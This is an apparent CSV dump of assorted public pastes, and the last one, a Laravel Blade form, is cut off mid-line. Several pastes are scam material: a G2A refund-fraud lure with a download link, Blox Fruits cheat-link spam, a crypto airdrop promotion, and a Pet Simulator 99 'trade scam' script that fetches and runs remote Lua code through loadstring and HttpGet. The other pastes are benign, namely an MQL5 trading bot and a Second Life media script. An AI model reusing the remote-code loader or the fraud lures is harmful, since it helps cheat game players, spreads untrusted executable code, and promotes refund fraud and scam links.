id,title,username,language,date,content
qTMXAT3W,🤑 G2A.com Refund Exploit Jan 2024 🤑,G2ARefundExploit,GetText,Tuesday 2nd of January 2024 11:16:48 PM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_845305.pdf
 
Working as of
03 January 2024"
M2dSvWrp,Pet Simulator 99!  🎉 2024 TradeScam Script,Project-WD,Lua,Tuesday 2nd of January 2024 11:13:32 PM CDT,"--Pet Simulator 99! 🎉 Trade Scam Script! (Copy and Put on Executor)
-------------------------------------------------------
--🆕 Updated (03/01/2024)
--Script📝:
loadstring(game:HttpGet(""https://raw.githubusercontent.com/Muhammed6196/Trading/main/Main.lua"" ))()
 
--Executors: Codex, Delta, ArceusX (My Opinion that Arceus X Best)

-- Updated Log 2024/01/03
-- Trade Scam With Huges (With #)
-- Trade Scam With Items (Fishing Rods, Shovels, Foods, Gifts)
-- Trade Scam With Multiple Devices"
ppEQNbNH,TRIP's_EA,Trip_dp,C++,Tuesday 2nd of January 2024 10:20:40 PM CDT,"//+------------------------------------------------------------------+
//|                                                      Test_01.mq5 |
//|                                  Copyright 2023, MetaQuotes Ltd. |
//|                                             https://www.mql5.com |
//+------------------------------------------------------------------+
#property copyright ""Copyright 2023, MetaQuotes Ltd.""
#property link      ""https://www.mql5.com""
#property version   ""1.00""
#define EXPERT_MAGIC 123456

//+------------------------------------------------------------------+
//| Expert initialization function                                   |
//+------------------------------------------------------------------+
int OnInit()
  {
//--- create timer
   EventSetTimer(60);

//---
   return(INIT_SUCCEEDED);
  }
//+------------------------------------------------------------------+
//| Expert deinitialization function                                 |
//+------------------------------------------------------------------+
void OnDeinit(const int reason)
  {
//--- destroy timer
   EventKillTimer();

  }

//+------------------------------------------------------------------+
//| Expert tick function                                             |
//+------------------------------------------------------------------+
void OnTick()
  {
   MqlTradeRequest EA_request = {};
   MqlTradeResult  EA_result = {};
/////////////////////////////////////VIDYA/////////////////////////////////////////////
   MqlRates priceArrayVIDYA[];
   double vidyaArray[];
   double vidyaArray1[];
   int DataVIDYA = CopyRates(_Symbol, _Period, 0, 3, priceArrayVIDYA);
   ArraySetAsSeries(vidyaArray, true);
   ArraySetAsSeries(vidyaArray1, true);
   int vidyaDef = iVIDyA(_Symbol, _Period, 9, 12, 0, PRICE_CLOSE);
   int vidyaDef1 = iVIDyA(_Symbol, _Period, 20, 50, 0, PRICE_CLOSE);
   CopyBuffer(vidyaDef, 0, 0, 3, vidyaArray);
   CopyBuffer(vidyaDef1, 0, 0, 3, vidyaArray1);
   double currentCloseVIDYA = NormalizeDouble(priceArrayVIDYA[2].close, 6);
   double vidyaVal = NormalizeDouble(vidyaArray[0], 6);
   double vidyaVal1 = NormalizeDouble(vidyaArray1[0], 6);

///////////////////RVI Moving Average/////////////////////////////////////////////////
   MqlRates pArrayRVI_MA[];
   double maArrayRVI_MA[];
   double rviArray[];
   double rviSignalArray[];
   int DataRVI_MA = CopyRates(_Symbol, _Period, 0, 1, pArrayRVI_MA);
   ArraySetAsSeries(maArrayRVI_MA, true);
   ArraySetAsSeries(rviArray, true);
   ArraySetAsSeries(rviSignalArray, true);
   int rviDef = iRVI(_Symbol, _Period, 10);
   int maDefRVI_MA = iMA(_Symbol, _Period, 100, 0, MODE_EMA, PRICE_CLOSE);
   CopyBuffer(rviDef, 0, 0, 3, rviArray);
   CopyBuffer(rviDef, 1, 0, 3, rviSignalArray);
   CopyBuffer(maDefRVI_MA, 0, 0, 3, maArrayRVI_MA);
   double rviValue = NormalizeDouble(rviArray[0], 3);
   double rviSignalValue = NormalizeDouble(rviSignalArray[0], 3);
   double maValueRVI_MA = NormalizeDouble(maArrayRVI_MA[0], 3);
////////////////////ACELERATOR_OSCILLATOR//////////////////////////////////////
   MqlRates pArrayACMA[];
   double acArray[];
   double maArrayACMA[];
   int DataACMA = CopyRates(_Symbol,_Period, 0, 1, pArrayACMA);
   ArraySetAsSeries(acArray, true);
   ArraySetAsSeries(maArrayACMA, true);
   int acDefACMA = iAC(_Symbol, _Period);
   int maDefACMA = iMA(_Symbol, _Period, 50, 0, MODE_EMA, PRICE_CLOSE);
   CopyBuffer(acDefACMA, 0, 0, 3, acArray);
   CopyBuffer(maDefACMA,0, 0, 3, maArrayACMA);
   int acMaxArray = ArrayMaximum(acArray, 1, WHOLE_ARRAY);
   int acMinArray = ArrayMinimum(acArray, 1, WHOLE_ARRAY);
   double closingPriceACMA = pArrayACMA[0].close;
   double acValue = NormalizeDouble(acArray[0], 7);
   double acMaxValue = NormalizeDouble(acArray[acMaxArray], 7);
   double acMinValue = NormalizeDouble(acArray[acMinArray], 7);
   double maValueACMA = NormalizeDouble(maArrayACMA[0], 7);

///////////////////////AWESOME_OSCILLATOR///////////////////////////////////////////
   MqlRates pArrayAO[];
   double aoArray[];
   double maArrayAO[];
   int DataAO = CopyRates(_Symbol, _Period, 0, 1, pArrayAO);
   ArraySetAsSeries(aoArray, true);
   ArraySetAsSeries(maArrayAO, true);
   int aoDef = iAO(_Symbol, _Period);
   int maDefAO = iMA(_Symbol, _Period, 50, 0, MODE_EMA, PRICE_CLOSE);
   CopyBuffer(aoDef, 0, 0, 3, aoArray);
   CopyBuffer(maDefAO, 0, 0,3, maArrayAO);
   double closingPriceAO = pArrayAO[0].close;
   double aoValue = NormalizeDouble(aoArray[0], 7);
   double maValueAO = NormalizeDouble(maArrayAO[0], 7);

///////////////////////////DeMARKER_DIVERGENCE//////////////////////////////////////////
   double deMarkerArray[];
   MqlRates pArrayDeMarker[];
   ArraySetAsSeries(deMarkerArray, true);
   ArraySetAsSeries(pArrayDeMarker, true);
   int deMarkerDef = iDeMarker(_Symbol, _Period, 14);
   int pDataDeMarker = CopyRates(_Symbol, _Period, 0, 14, pArrayDeMarker);
   CopyBuffer(deMarkerDef, 0, 0, 14, deMarkerArray);
   double deMarkerVal = NormalizeDouble(deMarkerArray[0], 4);
   double deMarkerPrevVal = NormalizeDouble(deMarkerArray[1], 4);
   double currentHighDeMarker = NormalizeDouble(pArrayDeMarker[0].high, 6);
   double currentLowDeMarker = NormalizeDouble(pArrayDeMarker[0].low, 6);
   double prevHighDeMarker = NormalizeDouble(pArrayDeMarker[1].high, 6);
   double prevLowDeMarker = NormalizeDouble(pArrayDeMarker[1].low, 6);

/////////////////////////////////////ADX//////////////////////////////////////
//creating a variable for signal
//Create arrays for current ADX value, previous ADX value, +DI value and -DI value
   double ADXArray0[];
   double ADXArray1[];
   double PDIArray[];
   double NDIArray[];

//Identifying the ADX, positive DI, negative DI.
   int ADXDef = iADX(_Symbol, _Period, 14);

//Sort price arrays from current data
   ArraySetAsSeries(ADXArray0,true);
   ArraySetAsSeries(ADXArray1,true);
   ArraySetAsSeries(PDIArray,true);
   ArraySetAsSeries(NDIArray,true);

//Filling data according to created ADX
   CopyBuffer(ADXDef,0,0,3,ADXArray0);
   CopyBuffer(ADXDef,0,0,2,ADXArray1);
   CopyBuffer(ADXDef,1,0,3,PDIArray);
   CopyBuffer(ADXDef,2,0,3,NDIArray);

//Getting values of the current data
   double ADXValue=NormalizeDouble(ADXArray0[0], 2);
   double ADXValueLast=NormalizeDouble(ADXArray1[1], 2);
   double PDIValue=NormalizeDouble(PDIArray[0], 2);
   double NDIValue=NormalizeDouble(NDIArray[0], 2);

//////////////////////////CONDITIONS////////////////////////////////////////////
//DEFINE BUY CONDITIONS
   bool BUY_CONDITION_1 = (vidyaVal > vidyaVal1);
   bool BUY_CONDITION_2 = (acValue > acMaxValue) && (closingPriceACMA > maValueACMA);
   bool BUY_CONDITION_3 = (aoValue > 0) && (closingPriceAO > maValueAO);
   bool BUY_CONDITION_4 = (pArrayRVI_MA[0].close > maValueRVI_MA) && (rviValue > rviSignalValue);
   bool BUY_CONDITION_5 = (ADXValue > 25) && (ADXValue > ADXValueLast);
   bool BUY_CONDITION_6 = (PDIValue > NDIValue);
   bool BUY_CONDITION_7 = (currentHighDeMarker > prevHighDeMarker) && (deMarkerVal < deMarkerPrevVal);

//DEFINE SELL CONDITIONS
   bool SELL_CONDITION_1 = (vidyaVal < vidyaVal1);
   bool SELL_CONDITION_2 = (acValue < acMinValue) && (closingPriceACMA < maValueACMA);
   bool SELL_CONDITION_3 = (aoValue < 0) && (closingPriceAO < maValueAO);
   bool SELL_CONDITION_4 = (pArrayRVI_MA[0].close < maValueRVI_MA) && (rviValue < rviSignalValue);
   bool SELL_CONDITION_5 = (ADXValue > 25) && (ADXValue > ADXValueLast);
   bool SELL_CONDITION_6 = (PDIValue < NDIValue);
   bool SELL_CONDITION_7 = (currentLowDeMarker < prevLowDeMarker) && (deMarkerVal > deMarkerPrevVal);

//BUY SIGNAL

//
//Comment(""Current Close Value is "",currentCloseVIDYA,""\n"",
//   ""Current VIDYA (9,12) Value is ""
//   ,vidyaVal,""\n"",
//   ""Current VIDYA (20,50) Value is "",vidyaVal1);

   if(BUY_CONDITION_1)
     {
      if(BUY_CONDITION_2)
        {
         if(BUY_CONDITION_3)
           {
            if(BUY_CONDITION_4)
              {
               if(BUY_CONDITION_5)
                 {
                  if(BUY_CONDITION_6)
                    {
                     if(BUY_CONDITION_7)
                       {

                        Comment(""BUY"", ""\n"",
                                ""AC Closing Price Is"", closingPriceACMA, ""\n"",
                                ""AC Value Is "", acValue, ""\n"",
                                ""AC Max Value Is "", acMaxValue, ""\n"",
                                ""AC Min Value Is "", acMinValue, ""\n"",
                                ""AC MA Value Is "", maValueACMA, ""\n"",
                                ""AO Closing Price is "", closingPriceAO, ""\n"",
                                ""AO Value Is "", aoValue, ""\n"",
                                ""AO MA Value Is "", maValueAO, ""\n"",
                                ""RVI Closing price is "", pArrayRVI_MA[0].close, ""\n"",
                                ""RVI MA Value is "", maValueRVI_MA, ""\n"",
                                ""Relative Vigor Index Is "", rviValue, ""\n"",
                                ""RVI Signal Value Is "", rviSignalValue, ""\n"",
                                ""ADX Value is "", ADXValue, ""\n"",
                                ""ADX Value Last is "", ADXValueLast, ""\n"",
                                ""+DI Value is "", PDIValue, ""\n"",
                                ""-DI Value is "", NDIValue, ""\n"",
                                ""Current High Is "", currentHighDeMarker, ""\n"",
                                ""Prev. High Value Is "", prevHighDeMarker, ""\n"",
                                ""Current DeMarker Value Is "", deMarkerVal, ""\n"",
                                ""Prev. DeMarker Value Is "", deMarkerPrevVal);

                        EA_request.action       = TRADE_ACTION_DEAL;
                        EA_request.symbol       = Symbol();
                        EA_request.volume       = 0.1;
                        EA_request.type         = ORDER_TYPE_BUY;
                        EA_request.price        = SymbolInfoDouble(Symbol(),SYMBOL_ASK);
                        EA_request.deviation    = 1;
                        EA_request.magic        = EXPERT_MAGIC;
                        EA_request.type_filling = ORDER_FILLING_IOC;

                        if(!OrderSend(EA_request, EA_result))
                           PrintFormat(""OrderSend error %d"",GetLastError());

                        PrintFormat(""retcode=%u  deal=%I64u  order=%I64u"",EA_result.retcode,EA_result.deal,EA_result.order);


                        int total=PositionsTotal();
                        for(int i=0; i<total; i++)
                          {

                           ulong  position_ticket=PositionGetTicket(i);
                           string position_symbol=PositionGetString(POSITION_SYMBOL);
                           int    digits=(int)SymbolInfoInteger(position_symbol,SYMBOL_DIGITS);
                           ulong  magic=PositionGetInteger(POSITION_MAGIC);
                           double volume=PositionGetDouble(POSITION_VOLUME);
                           double sl=PositionGetDouble(POSITION_SL);
                           double tp=PositionGetDouble(POSITION_TP);
                           ENUM_POSITION_TYPE type=(ENUM_POSITION_TYPE)PositionGetInteger(POSITION_TYPE);

                           PrintFormat(""#%I64u %s  %s  %.2f  %s  sl: %s  tp: %s  [%I64d]"", position_ticket, position_symbol,
                                       EnumToString(type), volume,
                                       DoubleToString(PositionGetDouble(POSITION_PRICE_OPEN),digits),
                                       DoubleToString(sl,digits),
                                       DoubleToString(tp,digits), magic);

                           if(magic==EXPERT_MAGIC && sl==0 && tp==0)
                             {

                              double price=PositionGetDouble(POSITION_PRICE_OPEN);
                              double bid=SymbolInfoDouble(position_symbol,SYMBOL_BID);
                              double ask=SymbolInfoDouble(position_symbol,SYMBOL_ASK);
                              int    stop_level=(int)SymbolInfoInteger(position_symbol,SYMBOL_TRADE_STOPS_LEVEL);
                              double price_level;

                              if(stop_level<=0)
                                 stop_level=15000;
                              else
                                 stop_level+=5000;

                              price_level=stop_level*SymbolInfoDouble(position_symbol,SYMBOL_POINT);

                              if(type==POSITION_TYPE_BUY)
                                {
                                 sl=NormalizeDouble(bid-price_level,digits);
                                 tp=NormalizeDouble(ask+price_level,digits);
                                }
                              else
                                {
                                 sl=NormalizeDouble(ask+price_level,digits);
                                 tp=NormalizeDouble(bid-price_level,digits);
                                }

                              ZeroMemory(EA_request);
                              ZeroMemory(EA_result);



                              EA_request.action   = TRADE_ACTION_SLTP;
                              EA_request.position = position_ticket;
                              EA_request.symbol   = position_symbol;
                              EA_request.sl       = sl;
                              EA_request.tp       = tp;
                              EA_request.magic    = EXPERT_MAGIC;

                              PrintFormat(""Modify #%I64d %s %s"",position_ticket,position_symbol,EnumToString(type));

                              if(!OrderSend(EA_request,EA_result))
                                 PrintFormat(""OrderSend error %d"",GetLastError());

                              PrintFormat(""retcode=%u  deal=%I64u  order=%I64u"",EA_result.retcode,EA_result.deal,EA_result.order);
                             }
                          }
                       }
                    }
                 }
              }
           }
        }
     }

//SELL SIGNAL
//Comment(""Current Close Value is "",currentCloseVIDYA,""\n"",
//      ""Current VIDYA (9,12) Value is "",vidyaVal,""\n"",""Current VIDYA (20,50) Value is "",vidyaVal1, ""\n"");

   if(SELL_CONDITION_1)
     {
      if(SELL_CONDITION_2)
        {
         if(SELL_CONDITION_3)
           {
            if(SELL_CONDITION_4)
              {
               if(SELL_CONDITION_5)
                 {
                  if(SELL_CONDITION_6)
                    {
                     if(SELL_CONDITION_7)
                       {
                       
                        Comment(""SELL"", ""\n"",
                                ""AC Closing Price Is "", closingPriceACMA, ""\n"",
                                ""AC Value Is "", acValue, ""\n"",
                                ""AC Max Value Is "", acMaxValue, ""\n"",
                                ""AC Min Value Is "", acMinValue, ""\n"",
                                ""AC MA Value is "", maValueACMA, ""\n"",
                                ""AO Closing Price Is "", closingPriceAO, ""\n"",
                                ""AO Value Is "", aoValue, ""\n"",
                                ""AO MA Value Is "", maValueAO, ""\n"",
                                ""RVI Closing Price Is "", pArrayRVI_MA[0].close, ""\n"",
                                ""RVI MA Value Is "", maValueRVI_MA, ""\n"",
                                ""Relative Vigor Index Is "", rviValue, ""\n"",
                                ""RVI Signal Value Is "", rviSignalValue, ""\n"",
                                ""ADX Value is "", ADXValue, ""\n"",
                                ""ADX Value Last is "", ADXValueLast, ""\n"",
                                ""+DI Value is "", PDIValue, ""\n"",
                                ""-DI Value is "", NDIValue, ""\n"",
                                ""Current Low Is "", currentLowDeMarker, ""\n"",
                                ""Prev. Low Is "", prevLowDeMarker, ""\n"",
                                ""Current DeMarker Value Is "", deMarkerVal, ""\n"",
                                ""Prev. DeMarker Value Is "", deMarkerPrevVal);

                        EA_request.action       = TRADE_ACTION_DEAL;
                        EA_request.symbol       = Symbol();
                        EA_request.volume       = 0.1;
                        EA_request.type         = ORDER_TYPE_SELL;
                        EA_request.price        = SymbolInfoDouble(Symbol(),SYMBOL_BID);
                        EA_request.deviation    = 1;
                        EA_request.magic        = EXPERT_MAGIC;
                        EA_request.type_filling = ORDER_FILLING_IOC;

                        if(!OrderSend(EA_request, EA_result))
                           PrintFormat(""OrderSend error %d"",GetLastError());

                        PrintFormat(""retcode=%u  deal=%I64u  order=%I64u"",EA_result.retcode,EA_result.deal,EA_result.order);

                        int total=PositionsTotal();
                        for(int i=0; i<total; i++)
                          {

                           ulong  position_ticket=PositionGetTicket(i);
                           string position_symbol=PositionGetString(POSITION_SYMBOL);
                           int    digits=(int)SymbolInfoInteger(position_symbol,SYMBOL_DIGITS);
                           ulong  magic=PositionGetInteger(POSITION_MAGIC);
                           double volume=PositionGetDouble(POSITION_VOLUME);
                           double sl=PositionGetDouble(POSITION_SL);
                           double tp=PositionGetDouble(POSITION_TP);
                           ENUM_POSITION_TYPE type=(ENUM_POSITION_TYPE)PositionGetInteger(POSITION_TYPE);

                           PrintFormat(""#%I64u %s  %s  %.2f  %s  sl: %s  tp: %s  [%I64d]"", position_ticket, position_symbol,
                                       EnumToString(type), volume,
                                       DoubleToString(PositionGetDouble(POSITION_PRICE_OPEN),digits),
                                       DoubleToString(sl,digits),
                                       DoubleToString(tp,digits), magic);

                           if(magic==EXPERT_MAGIC && sl==0 && tp==0)
                             {

                              double price=PositionGetDouble(POSITION_PRICE_OPEN);
                              double bid=SymbolInfoDouble(position_symbol,SYMBOL_BID);
                              double ask=SymbolInfoDouble(position_symbol,SYMBOL_ASK);
                              int    stop_level=(int)SymbolInfoInteger(position_symbol,SYMBOL_TRADE_STOPS_LEVEL);
                              double price_level;

                              if(stop_level<=0)
                                 stop_level=15000;
                              else
                                 stop_level+=5000;

                              price_level=stop_level*SymbolInfoDouble(position_symbol,SYMBOL_POINT);

                              if(type==POSITION_TYPE_BUY)
                                {
                                 sl=NormalizeDouble(bid-price_level,digits);
                                 tp=NormalizeDouble(ask+price_level,digits);
                                }
                              else
                                {
                                 sl=NormalizeDouble(ask+price_level,digits);
                                 tp=NormalizeDouble(bid-price_level,digits);
                                }

                              ZeroMemory(EA_request);
                              ZeroMemory(EA_result);

                              EA_request.action   = TRADE_ACTION_SLTP;
                              EA_request.position = position_ticket;
                              EA_request.symbol   = position_symbol;
                              EA_request.sl       = sl;
                              EA_request.tp       = tp;
                              EA_request.magic    = EXPERT_MAGIC;

                              PrintFormat(""Modify #%I64d %s %s"",position_ticket,position_symbol,EnumToString(type));

                              if(!OrderSend(EA_request,EA_result))
                                 PrintFormat(""OrderSend error %d"",GetLastError());

                              PrintFormat(""retcode=%u  deal=%I64u  order=%I64u"",EA_result.retcode,EA_result.deal,EA_result.order);
                             }
                          }
                       }
                    }
                 }
              }
           }
        }
     }
  }

//+------------------------------------------------------------------+
//| Timer function                                                   |
//+------------------------------------------------------------------+
void OnTimer()
  {
//---

  }
//+------------------------------------------------------------------+
//| Trade function                                                   |
//+------------------------------------------------------------------+
void OnTrade()
  {
//---

  }
//+------------------------------------------------------------------+
//| TradeTransaction function                                        |
//+------------------------------------------------------------------+
void OnTradeTransaction(const MqlTradeTransaction& trans,
                        const MqlTradeRequest& request,
                        const MqlTradeResult& result)
  {

  }
//+------------------------------------------------------------------+
//| Tester function                                                  |
//+------------------------------------------------------------------+
double OnTester()
  {
//---
   double ret=0.0;
//---

//---
   return(ret);
  }
//+------------------------------------------------------------------+
//| TesterInit function                                              |
//+------------------------------------------------------------------+
void OnTesterInit()
  {
//---

  }
//+------------------------------------------------------------------+
//| TesterPass function                                              |
//+------------------------------------------------------------------+
void OnTesterPass()
  {
//---

  }
//+------------------------------------------------------------------+
//| TesterDeinit function                                            |
//+------------------------------------------------------------------+
void OnTesterDeinit()
  {
//---

  }
//+------------------------------------------------------------------+
//| ChartEvent function                                              |
//+------------------------------------------------------------------+
void OnChartEvent(const int id,
                  const long &lparam,
                  const double &dparam,
                  const string &sparam)
  {
//---

  }
//+------------------------------------------------------------------+
//| BookEvent function                                               |
//+------------------------------------------------------------------+
void OnBookEvent(const string &symbol)
  {
//---

  }
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+

//+------------------------------------------------------------------+

//+------------------------------------------------------------------+


//+------------------------------------------------------------------+
"
ydnGnrcj,Blox Fruits Script Pastebin 2024,Artani,Lua,Tuesday 2nd of January 2024 10:14:56 PM CDT,"SCRIPT FOR ROBLOX BLOX FRUITS 2024 WORKING! BLOX FRUITS SCRIPT 2024! BLOX FRUITS SCRIPT KEYLESS!
Copy link into browser for script. Includes tutorial on how to get script and executor.
https://www.youtube.com/watch?v=QzwMAW5ETOk
Blox Fruits script
Blox Fruits script 2024
Blox Fruits script pastebin
Blox Fruits script pastebin 2024
Blox Fruits script pc
Blox Fruits script mobile
Blox Fruits script pc 2024
Blox Fruits script mobile 2024
Blox Fruits script delta
Blox Fruits script arceus x
Blox Fruits script fluxus
Blox Fruits script working 2024
Blox Fruits auto farm script
Blox Fruits auto farm script 2024
Blox Fruits auto farm script pastebin 2024
blox fruits working auto farm script
blox fruits autofarm"
5YXwfKGs,Untitled,Dorex,Linden Scripting,Tuesday 2nd of January 2024 10:12:23 PM CDT,"integer toggle ;
default {    

    touch_start(integer num) {       
        
         
        if (toggle = !toggle) {       
            llOwnerSay(""clearing"");
            llClearLinkMedia(2, 3) ;            
        } else {            
            llOwnerSay(""setting"");
            llSetLinkMedia(2, 3, [PRIM_MEDIA_AUTO_PLAY, TRUE 
                                ,PRIM_MEDIA_HOME_URL, ""https://www.youtube.com/watch?v=LazLHZ00Ms8""
                                ,PRIM_MEDIA_CURRENT_URL, ""https://www.youtube.com/watch?v=LazLHZ00Ms8""
                                ,PRIM_MEDIA_WIDTH_PIXELS, 512
                                ,PRIM_MEDIA_HEIGHT_PIXELS, 512
                                ,PRIM_MEDIA_AUTO_SCALE, TRUE
                                ] );            
        }    
    }
}"
DELJussy,🎁 List of all FREE Crypto Airdrops! 🎁,VQ-Moe,GetText,Tuesday 2nd of January 2024 10:04:27 PM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop.netlify.app/

689742"
UxwE8Hia,Blox Fruits Script Pastebin 2024,Artani,Lua,Tuesday 2nd of January 2024 10:01:16 PM CDT,"GET SCRIPT HERE! COPY LINK INTO BROWSER

https://artanisrbx.com/blox-fruits-script-2024/

BLOX FRUITS SCRIPT PASTEBIN 2024! (DEVIL FRUIT SNIPER, FRUIT ESP, AUTOFARM ECT)
Blox Fruits script
Blox Fruits script 2024
Blox Fruits script pastebin
Blox Fruits script pastebin 2024
Blox Fruits script pc
Blox Fruits script mobile
Blox Fruits script pc 2024
Blox Fruits script mobile 2024
Blox Fruits script delta
Blox Fruits script arceus x
Blox Fruits script fluxus
Blox Fruits script working 2024
Blox Fruits auto farm script
Blox Fruits auto farm script 2024
Blox Fruits auto farm script pastebin 2024
blox fruits working auto farm script
blox fruits autofarm"
rxZE1X3K,multiple select add more,shevaathalla,PHP,Tuesday 2nd of January 2024 09:59:29 PM CDT,"<?php

@extends('layouts.admin')

@push('head_script')
    <style>
        .select2-container--default .select2-selection--multiple .select2-selection__choice {
            background-color: #337ab7;
            color: #fff;
        }

        .select2-container--default .select2-selection--multiple .select2-selection_choice_remove {
            color: #fff;
        }
    </style>
@endpush
@section('content')
    <section class=""content-header"">
        <div class=""container-fluid"">
            @if (session('success'))
                <div class=""alert alert-success"">
                    {{ session('success') }}
                </div>
            @endif
            @if ($errors->any())
                <div class=""alert alert-danger"">
                    <ul>
                        @foreach ($errors->all() as $error)
                            <li>{{ $error }}</li>
                        @endforeach
                    </ul>
                </div>
            @endif
            <form action=""{{ route('admin.agenda.store') }}"" method=""post"">
                @csrf
                <div class=""row mb-4"">
                    <input type=""hidden"" class=""form-control"" name=""id"" placeholder=""id"" id=""id""
                        value=""{{ $data ? $data->agenda_id : '' }}"">

                    <div class=""col-md-2 mb-2"">
                        <label>Week <span class=""text-danger"">*</span></label>
                        <input type=""text"" id=""week_data"" value=""{{ $data ? $data->week_data : '' }}"" name=""week_data""
                            class=""form-control"" required onchange=""updateLabels()"">
                    </div>
                </div>

                <label class='text-success'>Senin <span id='label1'></span></label>
                <table class=""table table-striped"">
                    <thead>
                        <tr>
                            <th>Start Time <span class=""text-danger"">*</span></th>
                            <th>End Time <span class=""text-danger"">*</span></th>
                            <th>Agenda <span class=""text-danger"">*</span></th>
                            <th>BOD <span class=""text-danger"">*</span></th>
                            <th>Participant <span class=""text-danger"">*</span></th>
                            <th>Tempat <span class=""text-danger"">*</span></th>
                            <th>Actions <span class=""text-danger"">*</span></th>
                        </tr>
                    </thead>
                    <tbody id=""addMoreContainer1"">
                        <!-- Add more fields dynamically here -->
                    </tbody>
                </table>
                <div class=""mb-5"">
                    <div class=""float-right"">
                        <button class=""btn btn-success"" type=""button"" id=""addMore1"">Add
                            Agenda</button>
                    </div>
                </div>

                <label class='text-success'>Selasa <span id='label2'></span></label>
                <table class=""table table-striped"">
                    <thead>
                        <tr>
                            <th>Start Time <span class=""text-danger"">*</span></th>
                            <th>End Time <span class=""text-danger"">*</span></th>
                            <th>Agenda <span class=""text-danger"">*</span></th>
                            <th>BOD <span class=""text-danger"">*</span></th>
                            <th>Participant <span class=""text-danger"">*</span></th>
                            <th>Tempat <span class=""text-danger"">*</span></th>
                            <th>Actions <span class=""text-danger"">*</span></th>
                        </tr>
                    </thead>
                    <tbody id=""addMoreContainer2"">
                        <!-- Add more fields dynamically here -->
                    </tbody>
                </table>
                <div class=""mb-5"">
                    <div class=""float-right"">
                        <button class=""btn btn-success"" type=""button"" id=""addMore2"">Add
                            Agenda</button>
                    </div>
                </div>

                <label class='text-success'>Rabu <span id='label3'></span></label>
                <table class=""table table-striped"">
                    <thead>
                        <tr>
                            <th>Start Time <span class=""text-danger"">*</span></th>
                            <th>End Time <span class=""text-danger"">*</span></th>
                            <th>Agenda <span class=""text-danger"">*</span></th>
                            <th>BOD <span class=""text-danger"">*</span></th>
                            <th>Participant <span class=""text-danger"">*</span></th>
                            <th>Tempat <span class=""text-danger"">*</span></th>
                            <th>Actions <span class=""text-danger"">*</span></th>
                        </tr>
                    </thead>
                    <tbody id=""addMoreContainer3"">
                        <!-- Add more fields dynamically here -->
                    </tbody>
                </table>
                <div class=""mb-5"">
                    <div class=""float-right"">
                        <button class=""btn btn-success"" type=""button"" id=""addMore3"">Add
                            Agenda</button>
                    </div>
                </div>

                <label class='text-success'>Kamis <span id='label4'></span></label>
                <table class=""table table-striped"">
                    <thead>
                        <tr>
                            <th>Start Time <span class=""text-danger"">*</span></th>
                            <th>End Time <span class=""text-danger"">*</span></th>
                            <th>Agenda <span class=""text-danger"">*</span></th>
                            <th>BOD <span class=""text-danger"">*</span></th>
                            <th>Participant <span class=""text-danger"">*</span></th>
                            <th>Tempat <span class=""text-danger"">*</span></th>
                            <th>Actions <span class=""text-danger"">*</span></th>
                        </tr>
                    </thead>
                    <tbody id=""addMoreContainer4"">
                        <!-- Add more fields dynamically here -->
                    </tbody>
                </table>
                <div class=""mb-5"">
                    <div class=""float-right"">
                        <button class=""btn btn-success"" type=""button"" id=""addMore4"">Add
                            Agenda</button>
                    </div>
                </div>

                <label class='text-success'>Jumat <span id='label5'></span></label>
                <table class=""table table-striped"">
                    <thead>
                        <tr>
                            <th>Start Time <span class=""text-danger"">*</span></th>
                            <th>End Time <span class=""text-danger"">*</span></th>
                            <th>Agenda <span class=""text-danger"">*</span></th>
                            <th>BOD <span class=""text-danger"">*</span></th>
                            <th>Participant <span class=""text-danger"">*</span></th>
                            <th>Tempat <span class=""text-danger"">*</span></th>
                            <th>Actions <span class=""text-danger"">*</span></th>
                        </tr>
                    </thead>
                    <tbody id=""addMoreContainer5"">
                        <!-- Add more fields dynamically here -->
                    </tbody>
                </table>
                <div class=""mb-5"">
                    <div class=""float-right"">
                        <button class=""btn btn-success"" type=""button"" id=""addMore5"">Add
                            Agenda</button>
                    </div>
                </div>

                <label class='text-success'>Sabtu <span id='label6'></span></label>
                <table class=""table table-striped"">
                    <thead>
                        <tr>
                            <th>Start Time <span class=""text-danger"">*</span></th>
                            <th>End Time <span class=""text-danger"">*</span></th>
                            <th>Agenda <span class=""text-danger"">*</span></th>
                            <th>BOD <span class=""text-danger"">*</span></th>
                            <th>Participant <span class=""text-danger"">*</span></th>
                            <th>Tempat <span class=""text-danger"">*</span></th>
                            <th>Actions <span class=""text-danger"">*</span></th>
                        </tr>
                    </thead>
                    <tbody id=""addMoreContainer6"">
                        <!-- Add more fields dynamically here -->
                    </tbody>
                </table>
                <div class=""mb-5"">
                    <div class=""float-right"">
                        <button class=""btn btn-success"" type=""button"" id=""addMore6"">Add
                            Agenda</button>
                    </div>
                </div>

                <label class='text-success'>Minggu <span id='label7'></span></label>
                <table class=""table table-striped"">
                    <thead>
                        <tr>
                            <th>Start Time <span class=""text-danger"">*</span></th>
                            <th>End Time <span class=""text-danger"">*</span></th>
                            <th>Agenda <span class=""text-danger"">*</span></th>
                            <th>BOD <span class=""text-danger"">*</span></th>
                            <th>Participant <span class=""text-danger"">*</span></th>
                            <th>Tempat <span class=""text-danger"">*</span></th>
                            <th>Actions <span class=""text-danger"">*</span></th>
                        </tr>
                    </thead>
                    <tbody id=""addMoreContainer7"">
                        <!-- Add more fields dynamically here -->
                    </tbody>
                </table>
                <div class=""mb-5"">
                    <div class=""float-right"">
                        <button class=""btn btn-success"" type=""button"" id=""addMore7"">Add
                            Agenda</button>
                    </div>
                </div>


                {{-- <div class=""mb-5"">
                    <label>Ajukan Persetujuan Ke <span class=""text-danger"">*</span></label>
                    <select name=""need_approve_to"" id="""" class=""form-control"" required>
                        <option value="""">- Pilih Approval -</option>
                        <option value=""710375""
                            {{ isset($data->need_approve_to) ? ($data->need_approve_to == '710375' ? 'selected' : '') : '' }}>
                            710375 -
                            DIAN
                            RUSTANDI</option>
                        <option value=""928570""
                            {{ isset($data->need_approve_to) ? ($data->need_approve_to == '928570' ? 'selected' : '') : '' }}>
                            928570 -
                            CHANDRI
                            BUNGA WIJAYANTHI</option>
                    </select>
                </div> --}}
                <div class=""mb-5"">
                    <div class=""float-left"">
                        @if (isset($data->need_approve_to) &&
                                $data->need_approve_to == auth()->user()->username &&
